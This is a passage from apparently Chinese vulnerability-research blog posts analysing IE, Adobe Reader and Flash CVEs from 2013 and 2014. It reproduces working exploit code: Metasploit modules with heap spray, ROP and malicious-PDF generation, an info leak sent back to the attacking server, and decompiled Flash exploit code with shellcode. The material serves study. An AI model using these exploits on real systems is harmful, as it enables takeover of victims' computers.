24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44&quot;    &#125;  &#125;  var length_orig = vml1.dashstyle.array.length;  vml1.dashstyle.array.length = 0 - 1;  for (var i=0; i&lt;0x400; i++)  &#123;    a[i].marginLeft = &quot;a&quot;;    marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);    if (marginLeftAddress &gt; 0) &#123;      vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;      var leak = a[i].marginLeft;      vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress;      vml1.dashstyle.array.length = length_orig;      document.location = &quot;#&#123;uri_prefix&#125;?#&#123;@leak_param&#125;=&quot; + parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 )      return;    &#125;  &#125;&#125;    |    create_rects_func = &quot;createRects&quot;    exploit_func = &quot;exploit&quot;    if datastore[&#x27;OBFUSCATE&#x27;]      js_trigger = ::Rex::Exploitation::JSObfu.new(js_trigger)      js_trigger.obfuscate(memory_sensitive: true)      create_rects_func = js_trigger.sym(&quot;createRects&quot;)      exploit_func = js_trigger.sym(&quot;exploit&quot;)    end    html = %Q|&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=EmulateIE9&quot; &gt;&lt;/head&gt;&lt;title&gt;&lt;/title&gt;&lt;style&gt;v\\\\: * &#123; behavior:url(#default#VML); display:inline-block &#125;&lt;/style&gt;&lt;xml:namespace ns=&quot;urn:schemas-microsoft-com:vml&quot; prefix=&quot;v&quot; /&gt;&lt;script&gt;#&#123;js_trigger&#125;&lt;/script&gt;&lt;body onload=&quot;#&#123;create_rects_func&#125;(); #&#123;exploit_func&#125;();&quot;&gt;&lt;v:oval&gt;&lt;v:stroke id=&quot;vml1&quot;/&gt;&lt;/v:oval&gt;&lt;/body&gt;&lt;/html&gt;    |    return html  end  def set_rop(t, rop, info)    case rop    when /^ntdll$/i      t.opts[&#x27;Rop&#x27;] = :ntdll    when /^jre6$/i      if info[:java] !~ /1\\.6|6\\.0/        raise RuntimeError, &quot;Target does not have the suitable Java component (1.6) installed for our attack&quot;      end      t.opts[&#x27;Rop&#x27;] = :jre    end    return t  end  def on_request_exploit(cli, request, target_info)    begin      my_target = set_rop(get_target, datastore[&#x27;ROP&#x27;], target_info)    rescue RuntimeError =&gt; e      # This one is just a warning, because it&#x27;s a requirement check so it&#x27;s not that scary.      print_warning(e.message)      send_not_found(cli)      return    end    if my_target.opts[&#x27;Rop&#x27;] == :ntdll and request.uri !~ /#&#123;@second_stage_url&#125;/      html = html_info_leak      print_status(&quot;Sending HTML to info leak...&quot;)      send_response(cli, html, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;text/html&#x27;&#125;)    else      leak = begin        request.uri_parts[&quot;QueryString&quot;][@leak_param].to_i      rescue        0      end      if leak == 0        html = load_exploit_html(my_target, cli)        print_status(&quot;Sending HTML to trigger...&quot;)        send_response(cli, html, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;text/html&#x27;&#125;)        return      end      print_status(&quot;ntdll leak: 0x#&#123;leak.to_s(16)&#125;&quot;)      fingerprint = leak &amp; 0x0000ffff      case fingerprint      when 0x70B0        @ntdll_version = &quot;6.1.7601.17514&quot;        @ntdll_base = leak - 0x470B0      when 0x7090        @ntdll_version = &quot;6.1.7601.17725&quot; # MS12-001        @ntdll_base = leak - 0x47090      else        print_warning(&quot;ntdll version not detected, sending 404&quot;)        send_not_found(cli)        return      end      html = load_exploit_html(my_target, cli)      print_status(&quot;Sending HTML to trigger...&quot;)      send_response(cli, html, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;text/html&#x27;&#125;)    end  endend\n\n漏洞利用的大体思路是\n\n通过任意地址读泄露 ntdll.dll 基址\n通过堆喷布局 shellcode 或通过漏洞自身的任意地址读定位 shellcode\n通过任意地址写劫持虚表\nROP 劫持控制流到 shellcode\n\n经典套路，只是利用了一些 JS 和 IE 的 version-specific feature，详见 Advanced Exploitation of Internet Explorer 10 &#x2F; Windows 8 Overflow (Pwn2Own 2013) 或《漏洞战争》原本或各路大神漏洞利用博客，eg. CVE-2013-2551漏洞成因与利用分析, 看雪论坛精华帖\n漏洞修复Patch 后 VGX.dll 中的 COALineDashStyleArray::put_length 函数增加了在设置 dashstyle.array.length 属性时对输入参数的检查，具体来说如果目标长度小于 0 则函数将发生跳转以确保其值不会溢出\nReferenceNVD - CVE-2013-2551CVE - CVE-2013-2551Microsoft安全公告 MS13-037 - 严重漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2013-3346 漏洞研究","url":"/2025/04/01/Vulnerability%20Investigation/CVE-2013-3346%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"2014 年 8 月，卡巴斯基反病毒实验室曝光了一起当时最为复杂的 APT 攻击行动——“Epic Turla”，攻击目标主要为政府机构、大使馆、军事组织、研究和教育组织及制药企业，攻击中东及欧洲各国，影响范围超过 45 个国家，也正因为其影响之广，被称为“世界十大最大危险的网络攻击”之一。据悉，此次攻击行动可能和俄罗斯政府有关，病毒可能是俄罗斯安全专家所开发的。\n在此次攻击行动中，主要用到了 2 个 0day 漏洞：CVE-2013-3346(Adobe Reader ToolButton UAF) 和 CVE-2013-5065(Windows 本地内核提权)，其中的提权漏洞主要用于绕过 Adobe Reader 的沙盒保护，但在本节主要是分析此次攻击行动中所使用的 PDF 漏洞，攻击者主要是将恶意 PDF 以邮件附件的形式发送给受害者，当受害者打开恶意 PDF 后，攻击者即可完全控制受害者电脑。\n影响范围：\nAdobe Reader and Acrobat 9.x before 9.5.5, 10.x before 10.1.7, and 11.x before 11.0.03\n漏洞分析调试运行 Adobe Reader 并打开样本后程序因触发 ACcess Violation 异常而崩溃。通过栈回溯查看栈顶栈帧的返回地址，通过返回地址定位到 Crash Function，阅读 Crash Point 前的指令可推断出 esi 指向了虚表指针\nmov eax, dword ptr [esi]...call dword ptr [eax+364h]\n\n查看 esi 指向的内存区域发现是紧跟着 padding 字符串一个地址，即用于劫持程序执行流的覆盖地址\n《漏洞战争》一书在对此漏洞进行分析时没有对其进行调试，而是使用了 peepdf 这一工具对 PDF 恶意样本进行分析。其原因在于尽管此漏洞和原理和一般的 UAF 漏洞别无二致，但漏洞形成的过程和 Adobe Reader 对象创建的释放机制密切相关，需要花费比较大的精力在逆向研究漏洞对象的释放和 UAF 过程上。因此直接分析 PoC 会更容易理解漏洞的成因和触发一些\n使用 peepdf 并开启 f 参数对样本 PDF 文件进行强制解析，发现 PDF 文件打开时的执行动作引用了对象 1，对象 1 的打开执行动作引用了对象 2，对象 2 引用了对象 3，对象 3 内包含了经过 jjencode 加密处理过后的 JS 代码，其开头片段如下\nif(app.media.getPlayers().length &gt;= 1) Q=~[];Q=&#123;___:++Q,$$$$:(![]+&quot;&quot;)[Q],__$:++Q,$_$_:(![]+&quot;&quot;)[Q],_$_:++Q,$_$$:(&#123;&#125;+&quot;&quot;)[Q],$$_$:(Q[Q]+&quot;&quot;)[Q],_$$:++Q,$$$_:(!&quot;&quot;+&quot;&quot;)[Q],$__:++Q,$_$:++Q,$$__:(&#123;&#125;+&quot;&quot;)[Q],$$_:++Q,$$$:++Q,$___:++Q,$__$:++Q&#125;;Q.$_=(Q.$_=Q+&quot;&quot;)[Q.$_$]+(Q._$=Q.$_[Q.__$])+(Q.$$=(Q.$+&quot;&quot;)[Q.__$])+((!Q)+&quot;&quot;)[Q._$$]+(Q.__=Q.$_[Q.$$_])+(Q.$=(!&quot;&quot;+&quot;&quot;)[Q.__$])+(Q._=(!&quot;&quot;+&quot;&quot;)[Q._$_])+Q.$_[Q.$_$]+Q.__+Q._$+Q.$;Q.$$=Q.$+(!&quot;&quot;+&quot;&quot;)[Q._$$]+Q.__+Q._+Q.$+Q.$$;Q.$=(Q.___)[Q.$_][Q.$_];...\n\n没用 JSFuck 写，还是不够 JS 魅力时刻。使用 js__jjdecode 对这段 JS 代码解码后得到 POC。除堆喷和 shellcode 外，用于触发漏洞的 JS 代码如下\napp.addToolButton(&#123;        cName: &quot;evil&quot;,        cExec: &quot;1&quot;,        cEnable: &quot;addButtonFunc();&quot;&#125;);    // 创建父 ToolButton 对象并设置回调函数 addButtonFuncaddButtonFunc = function() &#123;        app.addToolButton(&#123;cName: &quot;xxx&quot;, cExec: &quot;1&quot;, cEnable: &quot;removeButtonFunc();&quot;&#125;);&#125;  // 创建子 ToolButton 对象并设置了回调函数 removeButtonFuncremoveButtonFunc = function() &#123;        app.removeToolButton(&#123;cName: &quot;evil&quot;&#125;);   // 删除父对象        for (i=0;i &lt; 10;i++)                arr[i] = part1.concat(part2);&#125;\n\n注意到 PoC 首先调用 app.addToolButton 函数创建了一个父 ToolButton 对象并为其设置了回调函数 addButtonFunc，再在父对象的回调函数内创建了子 ToolButton 对象并为其设置了回调函数 removeButtonFunc，最后在子对象的回调函数内调用 app.removeToolButton 函数删除了父对象。由于其 JS 对象创建和实现机制上存在的问题，父对象将因此被释放，子对象却仍能保留对父对象的引用，进而导致 UAF。而堆喷会进行占位并如调试结果那般覆盖虚表指针并劫持\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2013-3346\n\n搜索结果\nMatching Modules================   #  Name                                         Disclosure Date  Rank    Check  Description   -  ----                                         ---------------  ----    -----  -----------   0  exploit/windows/browser/adobe_toolbutton     2013-08-08       normal  No     Adobe Reader ToolButton Use After Free   1  exploit/windows/fileformat/adobe_toolbutton  2013-08-08       normal  No     Adobe Reader ToolButton Use After FreeInteract with a module by name or index. For example info 1, use 1 or use exploit/windows/fileformat/adobe_toolbutton\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/fileformat/adobe_toolbuttonmsf6 exploit(windows/fileformat/adobe_toolbutton) &gt; info\n\n模块详情信息\n       Name: Adobe Reader ToolButton Use After Free     Module: exploit/windows/fileformat/adobe_toolbutton   Platform: Windows       Arch:  Privileged: No    License: Metasploit Framework License (BSD)       Rank: Normal  Disclosed: 2013-08-08Provided by:  Soroush Dalili  Unknown  sinn3r &lt;sinn3r@metasploit.com&gt;  juan vazquez &lt;juan.vazquez@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   Windows XP / Adobe Reader 9/10/11Check supported:  NoBasic options:  Name      Current Setting  Required  Description  ----      ---------------  --------  -----------  FILENAME  msf.pdf          yes       The file name.Payload information:  Space: 1024  Avoid: 1 charactersDescription:  This module exploits a use after free condition on Adobe Reader versions 11.0.2, 10.1.6  and 9.5.4 and prior. The vulnerability exists while handling the ToolButton object, where  the cEnable callback can be used to early free the object memory. Later use of the object  allows triggering the use after free condition. This module has been tested successfully  on Adobe Reader 11.0.2, 10.0.4 and 9.5.0 on Windows XP SP3, as exploited in the wild in  November, 2013.References:  https://nvd.nist.gov/vuln/detail/CVE-2013-3346  OSVDB (96745)  http://www.zerodayinitiative.com/advisories/ZDI-13-212  http://www.adobe.com/support/security/bulletins/apsb13-15.html  http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.htmlView the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/fileformat/adobe_toolbutton) &gt; set payload windows/execmsf6 exploit(windows/fileformat/adobe_toolbutton) &gt; set CMD calc.exemsf6 exploit(windows/fileformat/adobe_toolbutton) &gt; exploit\n\n随后 MSF 将创建 msf.pdf 文件用以欺骗受害者打开并触发漏洞和 payload\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/fileformat/adobe_toolbutton.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::FILEFORMAT  include Msf::Exploit::RopDb  def initialize(info = &#123;&#125;)    super(update_info(info,      &#x27;Name&#x27;           =&gt; &#x27;Adobe Reader ToolButton Use After Free&#x27;,      &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,      &#x27;License&#x27;        =&gt; MSF_LICENSE,      &#x27;Author&#x27;         =&gt; [...],      &#x27;References&#x27;     =&gt; [...],      &#x27;Payload&#x27;        =&gt; &#123;...&#125;,      &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,      &#x27;Targets&#x27;        =&gt; [...],      &#x27;Privileged&#x27;     =&gt; false,      &#x27;DisclosureDate&#x27; =&gt; &#x27;2013-08-08&#x27;,      &#x27;DefaultTarget&#x27;  =&gt; 0))    register_options([...])  end  def exploit    js_data = make_js    # Create the pdf    pdf = make_pdf(js_data)    print_status(&quot;Creating &#x27;#&#123;datastore[&#x27;FILENAME&#x27;]&#125;&#x27; file...&quot;)    file_create(pdf)  end  def make_js    # CreateFileMappingA + MapViewOfFile + memcpy rop chain    rop_9 = Rex::Text.to_unescape(generate_rop_payload(&#x27;reader&#x27;, &#x27;&#x27;, &#123; &#x27;target&#x27; =&gt; &#x27;9&#x27; &#125;))    rop_10 = Rex::Text.to_unescape(generate_rop_payload(&#x27;reader&#x27;, &#x27;&#x27;, &#123; &#x27;target&#x27; =&gt; &#x27;10&#x27; &#125;))    rop_11 = Rex::Text.to_unescape(generate_rop_payload(&#x27;reader&#x27;, &#x27;&#x27;, &#123; &#x27;target&#x27; =&gt; &#x27;11&#x27; &#125;))    escaped_payload = Rex::Text.to_unescape(payload.encoded)    js = %Q|function heapSpray(str, str_addr, r_addr) &#123;  var aaa = unescape(&quot;%u0c0c&quot;);  aaa += aaa;  while ((aaa.length + 24 + 4) &lt; (0x8000 + 0x8000)) aaa += aaa;  var i1 = r_addr - 0x24;  var bbb = aaa.substring(0, i1 / 2);  var sa = str_addr;  while (sa.length &lt; (0x0c0c - r_addr)) sa += sa;  bbb += sa;  bbb += aaa;  var i11 = 0x0c0c - 0x24;  bbb = bbb.substring(0, i11 / 2);  bbb += str;  bbb += aaa;  var i2 = 0x4000 + 0xc000;  var ccc = bbb.substring(0, i2 / 2);  while (ccc.length &lt; (0x40000 + 0x40000)) ccc += ccc;  var i3 = (0x1020 - 0x08) / 2;  var ddd = ccc.substring(0, 0x80000 - i3);  var eee = new Array();  for (i = 0; i &lt; 0x1e0 + 0x10; i++) eee[i] = ddd + &quot;s&quot;;  return;&#125;var shellcode = unescape(&quot;#&#123;escaped_payload&#125;&quot;);var executable = &quot;&quot;;var rop9 = unescape(&quot;#&#123;rop_9&#125;&quot;);var rop10 = unescape(&quot;#&#123;rop_10&#125;&quot;);var rop11 = unescape(&quot;#&#123;rop_11&#125;&quot;);var r11 = false;var vulnerable = true;var obj_size;var rop;var ret_addr;var rop_addr;var r_addr;if (app.viewerVersion &gt;= 9 &amp;&amp; app.viewerVersion &lt; 10 &amp;&amp; app.viewerVersion &lt;= 9.504) &#123;  obj_size = 0x330 + 0x1c;  rop = rop9;  ret_addr = unescape(&quot;%ua83e%u4a82&quot;);  rop_addr = unescape(&quot;%u08e8%u0c0c&quot;);  r_addr = 0x08e8;&#125; else if (app.viewerVersion &gt;= 10 &amp;&amp; app.viewerVersion &lt; 11 &amp;&amp; app.viewerVersion &lt;= 10.106) &#123;  obj_size = 0x360 + 0x1c;  rop = rop10;  rop_addr = unescape(&quot;%u08e4%u0c0c&quot;);  r_addr = 0x08e4;  ret_addr = unescape(&quot;%ua8df%u4a82&quot;);&#125; else if (app.viewerVersion &gt;= 11 &amp;&amp; app.viewerVersion &lt;= 11.002) &#123;  r11 = true;  obj_size = 0x370;  rop = rop11;  rop_addr = unescape(&quot;%u08a8%u0c0c&quot;);  r_addr = 0x08a8;  ret_addr = unescape(&quot;%u8003%u4a84&quot;);&#125; else &#123;  vulnerable = false;&#125;if (vulnerable) &#123;  var payload = rop + shellcode;  heapSpray(payload, ret_addr, r_addr);  var part1 = &quot;&quot;;  if (!r11) &#123;    for (i = 0; i &lt; 0x1c / 2; i++) part1 += unescape(&quot;%u4141&quot;);  &#125;  part1 += rop_addr;  var part2 = &quot;&quot;;  var part2_len = obj_size - part1.length * 2;  for (i = 0; i &lt; part2_len / 2 - 1; i++) part2 += unescape(&quot;%u4141&quot;);  var arr = new Array();  removeButtonFunc = function () &#123;    app.removeToolButton(&#123;        cName: &quot;evil&quot;    &#125;);    for (i = 0; i &lt; 10; i++) arr[i] = part1.concat(part2);  &#125;  addButtonFunc = function () &#123;    app.addToolButton(&#123;      cName: &quot;xxx&quot;,      cExec: &quot;1&quot;,      cEnable: &quot;removeButtonFunc();&quot;    &#125;);  &#125;  app.addToolButton(&#123;    cName: &quot;evil&quot;,    cExec: &quot;1&quot;,    cEnable: &quot;addButtonFunc();&quot;  &#125;);&#125;|    js  end  def random_non_ascii_string(count)    result = &quot;&quot;    count.times do      result &lt;&lt; (rand(128) + 128).chr    end    result  end  def io_def(id)    &quot;%d 0 obj \\n&quot; % id  end  def io_ref(id)    &quot;%d 0 R&quot; % id  end  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/  def n_obfu(str)    #return str    result = &quot;&quot;    str.scan(/./u) do |c|      if rand(2) == 0 and c.upcase &gt;= &#x27;A&#x27; and c.upcase &lt;= &#x27;Z&#x27;        result &lt;&lt; &quot;#%x&quot; % c.unpack(&quot;C*&quot;)[0]      else        result &lt;&lt; c      end    end    result  end  def ascii_hex_whitespace_encode(str)    result = &quot;&quot;    whitespace = &quot;&quot;    str.each_byte do |b|      result &lt;&lt; whitespace &lt;&lt; &quot;%02x&quot; % b      whitespace = &quot; &quot; * (rand(3) + 1)    end    result &lt;&lt; &quot;&gt;&quot;  end  def make_pdf(js)    xref = []    eol = &quot;\\n&quot;    endobj = &quot;endobj&quot; &lt;&lt; eol    # Randomize PDF version?    pdf = &quot;%PDF-1.5&quot; &lt;&lt; eol    pdf &lt;&lt; &quot;%&quot; &lt;&lt; random_non_ascii_string(4) &lt;&lt; eol    # catalog    xref &lt;&lt; pdf.length    pdf &lt;&lt; io_def(1) &lt;&lt; n_obfu(&quot;&lt;&lt;&quot;) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/Pages &quot;) &lt;&lt; io_ref(2) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/Type /Catalog&quot;) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/OpenAction &quot;) &lt;&lt; io_ref(4) &lt;&lt; eol    # The AcroForm is required to get icucnv36.dll / icucnv40.dll to load    pdf &lt;&lt; n_obfu(&quot;/AcroForm &quot;) &lt;&lt; io_ref(6) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;&gt;&gt;&quot;) &lt;&lt; eol    pdf &lt;&lt; endobj    # pages array    xref &lt;&lt; pdf.length    pdf &lt;&lt; io_def(2) &lt;&lt; n_obfu(&quot;&lt;&lt;&quot;) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/Kids [&quot;) &lt;&lt; io_ref(3) &lt;&lt; &quot;]&quot; &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/Count 1&quot;) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/Type /Pages&quot;) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;&gt;&gt;&quot;) &lt;&lt; eol    pdf &lt;&lt; endobj    # page 1    xref &lt;&lt; pdf.length    pdf &lt;&lt; io_def(3) &lt;&lt; n_obfu(&quot;&lt;&lt;&quot;) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/Parent &quot;) &lt;&lt; io_ref(2) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;/Type /Page&quot;) &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;&gt;&gt;&quot;) &lt;&lt; eol # end obj dict    pdf &lt;&lt; endobj    # js action    xref &lt;&lt; pdf.length    pdf &lt;&lt; io_def(4) &lt;&lt; n_obfu(&quot;&lt;&lt;&quot;)    pdf &lt;&lt; n_obfu(&quot;/Type/Action/S/JavaScript/JS &quot;) + io_ref(5)    pdf &lt;&lt; n_obfu(&quot;&gt;&gt;&quot;) &lt;&lt; eol    pdf &lt;&lt; endobj    # js stream    xref &lt;&lt; pdf.length    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js))    pdf &lt;&lt; io_def(5) &lt;&lt; n_obfu(&quot;&lt;&lt;/Length %s/Filter[/FlateDecode/ASCIIHexDecode]&gt;&gt;&quot; % compressed.length) &lt;&lt; eol    pdf &lt;&lt; &quot;stream&quot; &lt;&lt; eol    pdf &lt;&lt; compressed &lt;&lt; eol    pdf &lt;&lt; &quot;endstream&quot; &lt;&lt; eol    pdf &lt;&lt; endobj    ###    # The following form related data is required to get icucnv36.dll / icucnv40.dll to load    ###    # form object    xref &lt;&lt; pdf.length    pdf &lt;&lt; io_def(6)    pdf &lt;&lt; n_obfu(&quot;&lt;&lt;/XFA &quot;) &lt;&lt; io_ref(7) &lt;&lt; n_obfu(&quot;&gt;&gt;&quot;) &lt;&lt; eol    pdf &lt;&lt; endobj    # form stream    xfa = &lt;&lt;-EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;&lt;config xmlns=&quot;http://www.xfa.org/schema/xci/2.6/&quot;&gt;&lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;/interactive&gt;&lt;/pdf&gt;&lt;/present&gt;&lt;/config&gt;&lt;template xmlns=&quot;http://www.xfa.org/schema/xfa-template/2.6/&quot;&gt;&lt;subform name=&quot;form1&quot; layout=&quot;tb&quot; locale=&quot;en_US&quot;&gt;&lt;pageSet&gt;&lt;/pageSet&gt;&lt;/subform&gt;&lt;/template&gt;&lt;/xdp:xdp&gt;EOF    xref &lt;&lt; pdf.length    pdf &lt;&lt; io_def(7) &lt;&lt; n_obfu(&quot;&lt;&lt;/Length %s&gt;&gt;&quot; % xfa.length) &lt;&lt; eol    pdf &lt;&lt; &quot;stream&quot; &lt;&lt; eol    pdf &lt;&lt; xfa &lt;&lt; eol    pdf &lt;&lt; &quot;endstream&quot; &lt;&lt; eol    pdf &lt;&lt; endobj    ###    # end form stuff for icucnv36.dll / icucnv40.dll    ###    # trailing stuff    xrefPosition = pdf.length    pdf &lt;&lt; &quot;xref&quot; &lt;&lt; eol    pdf &lt;&lt; &quot;0 %d&quot; % (xref.length + 1) &lt;&lt; eol    pdf &lt;&lt; &quot;0000000000 65535 f&quot; &lt;&lt; eol    xref.each do |index|      pdf &lt;&lt; &quot;%010d 00000 n&quot; % index &lt;&lt; eol    end    pdf &lt;&lt; &quot;trailer&quot; &lt;&lt; eol    pdf &lt;&lt; n_obfu(&quot;&lt;&lt;/Size %d/Root &quot; % (xref.length + 1)) &lt;&lt; io_ref(1) &lt;&lt; &quot;&gt;&gt;&quot; &lt;&lt; eol    pdf &lt;&lt; &quot;startxref&quot; &lt;&lt; eol    pdf &lt;&lt; xrefPosition.to_s() &lt;&lt; eol    pdf &lt;&lt; &quot;%%EOF&quot; &lt;&lt; eol    pdf  endend=begin* crash Adobe Reader 10.1.4First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=0c0c08e4 ebx=00000000 ecx=02eb6774 edx=66dd0024 esi=02eb6774 edi=00000001eip=604d3a4d esp=0012e4fc ebp=0012e51c iopl=0         nv up ei pl nz ac po cycs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213AcroRd32_60000000!PDFLTerm+0xbb7cd:604d3a4d ff9028030000    call    dword ptr [eax+328h] ds:0023:0c0c0c0c=????????* crash Adobe Reader 11.0.2(940.d70): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Adobe\\Reader 11.0\\Reader\\AcroRd32.dll -eax=0c0c08a8 ebx=00000001 ecx=02d68090 edx=5b21005b esi=02d68090 edi=00000000eip=60197b9b esp=0012e3fc ebp=0012e41c iopl=0         nv up ei pl nz ac po cycs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210213AcroRd32_60000000!DllCanUnloadNow+0x1493ae:60197b9b ff9064030000    call    dword ptr [eax+364h] ds:0023:0c0c0c0c=????????=end\n\n注意到其实就是包装了 ROP 等相关逻辑的 PoC，具体地说不同 Adobe 版本的 ToolButton 对象的大小不同且适用的 ROP 链不同，需要根据软件环境进行选择。除此之外的漏洞利用部分和常规 UAF 漏洞利用一致，无需多言。\n漏洞修复可参阅 apsb13-15\nReferenceNVD - CVE-2013-3346CVE - CVE-2013-3346漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2014-0502 漏洞研究","url":"/2025/02/22/Vulnerability%20Investigation/CVE-2014-0502%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"2014 年 2 月知名安全厂商 FireEye 捕获到了一个针对被广泛使用的 Adobe Flash 最新版本的 0day 漏洞利用样本，具体地说该样本利用了 Adobe Flash Player 处理共享对象方式中的 bug 引起的 double free 漏洞。它是一场 Water Hole 0day 攻击的一部分，对多个非营利组织的网站进行了感染，例如在美国的经济和外交政策智库网站挂马。此次攻击被 FireEye 命名为 Operation GreedyWonk\n影响范围：\nAdobe Flash Player(on Windows and Max OS X) 11.7.700.269 之前的所有版本Adobe Flash Player(on Linux) 11.2.202.341 之前的所有版本Adobe AIR (on Android) 4.0.0.1628 之前的所有版本Adobe Air SDK (&amp; Compiler) 4.0.0.1628 之前的所有版本\nAction Script Worker &amp; Shared ObjectAction Script 通过 worker 这一抽象实现了对后台线程的支持，每一个 worker 都将在一个单独的线程里执行代码，其中主 SWF 会被自动创建一个 Primordial Worker。每个 Worker 都将独立执行，有着自己的内存空间，变脸和代码，彼此之间通过 Shared Properties, Message Channel 和同样可共享的 Byte Array 通信\nShared Object 或 Flush Cookie 是网站在用户计算机上创建的数据文件，可用于在本地及远程读取和保存数据。它维护了一个缓冲区，并且会在以下情况中进行 flush 操作\n\n显式调用 flush 函数\n共享对象生命周期结束时\n\n当一个 Worker 或 Adobe Flash Player 实例被终止时，所有共享对象都会被销毁，如上文所说此时共享对象会在销毁前进行一次 flush 将数据保存到磁盘。共享对象析构时将调用 Exit 函数，该函数会执行两项检查\n\n检查 Pending Flush 标志位，它知识是否有数据需要刷新到磁盘\n检查域的 Maximum Storage 设置(默认 100 KB)\n\n如果第一次检查通过，并且进程尝试进行 flush 操作保存数据，无论检查成功与否，它都会在完成时释放对象块。\n漏洞分析将样本放置在服务器上（避免直接打开被沙箱拦截），调试运行 IE 并通过 URL 打开样本后触发 Access Violation 异常。惯例地先进行栈回溯，发现函数调用栈只有两个栈帧，显然栈空间已被破坏。在已知的最高地址的栈帧函数处下条件断点会发现该函数在样本触发的执行流中被调用了上百次，显然不会是程序崩溃的第一现场，漏洞分析陷入僵局或者说变得有些力不从心\n《漏洞战争》和其它分析的博客通过反编译得到了 exp 的源码，再根据 exp 中的 ROP 链断到了 ROP 链的入口地址，进而找到了程序跳转到 ROP 链前执行到的位置，发现此时程序正在释放共享对象，同时联系栈回溯中得到的 DLL 函数推断出该释放是析构函数所为。即共享对象的二次析构导致了 double free 漏洞的产生\n有一说一这个漏洞确实很难只通过动态调试弄明白漏洞成因，哪怕只是定位到漏洞发生位置都需要借助逆向 exp 才能连懵带猜地找到第一现场，令人感慨\n因此具体的漏洞成因分析可参见下文的 Exploit 分析\n漏洞利用被感染的网站将会包含一个 Iframe 以便将访问者重定向到另一个包含恶意 exploit 的网站（giftserv.hopto.org）。这个新的网站会加载一个恶意的 index.php 文件（Trojan.Malscript），该文件检查受害者机器上运行的操作系统位数，并根据检测结果从攻击者服务器（4.59.141.44）上托管的对应位数的文件夹中下载恶意的 index.html 文件（也是 Trojan.Malscript）和其它组件。然后，恶意 index.html 文件将加载包含 0day 漏洞的 cc.swf Adobe Flash 文件（Trojan.Swifi）。若受害者系统环境在漏洞影响范围内，该 exp 将通过堆喷控制堆空间布局，在 double free 破坏堆区解构后将劫持程序控制流到 ROP 链上，同时下载一个包含加密 shellcode 的 logo.gif 图片马，ROP 链将调转到图片马中 shellcode 以下载并执行包含恶意远控程序 server.exe（Backdoor.Jolob）的 payload，使得攻击者能够完全控制受害者主机\nExploit 分析样本实际上是一段 Flash Action Script 代码编译得到的 swf 文件，因此可以尝试通过 JPEXS Free Flash Decompiler 等工具对其进行反编译，其结果如下\nScriptpackage&#123;    import flash.display.Sprite;    import flash.events.Event;    import flash.external.ExternalInterface;    import flash.net.SharedObject;    import flash.net.URLLoader;    import flash.net.URLLoaderDataFormat;    import flash.net.URLRequest;    import flash.system.Capabilities;    import flash.system.System;    import flash.system.Worker;    import flash.system.WorkerDomain;    import flash.utils.ByteArray;    import flash.utils.Endian;        public class cc extends Sprite    &#123;        var bgWorker:Worker;        var systemcase:int;                //public var cc_shellcode:String = &quot;19921231dbd7d97424f4b879c464b733c9b1385d83c504314513033cd78642423fcfadbac0b0245ff1e25314a032177849b87568dacc519f6b7a84ae6c4a087caeccf47ee32ec4b1f62f01aff962daa4a8926ff87092bf77c8ecba47bd46c4976edc8e0f04ba2e2ec9d81379662ae778ae62084b8e29376403337f42fc468bb1815048c85dd44d6a154eb68bfa093d87b75e198b46b211b7c335f63e9711d21b433b43c1224493ad9be0df5fcf93bd350e11b8701029c3d2791848bdfea59bfaf1ef86aa99a952efc7498933fec938cb05d148ce4255a0a2db30c611db10a5af7fcc43a11b9de44eb83272c334d0e910874691378b157bd22bbf83&quot;;                public var sc:String = new String();                static const POOL_SIZE:int = 0x100000;        static var allocs:Array;        static var pool:ByteArray;        static var dstSize:int;        static var allocCount:int;                public function onComplete(e:Event):void        &#123;      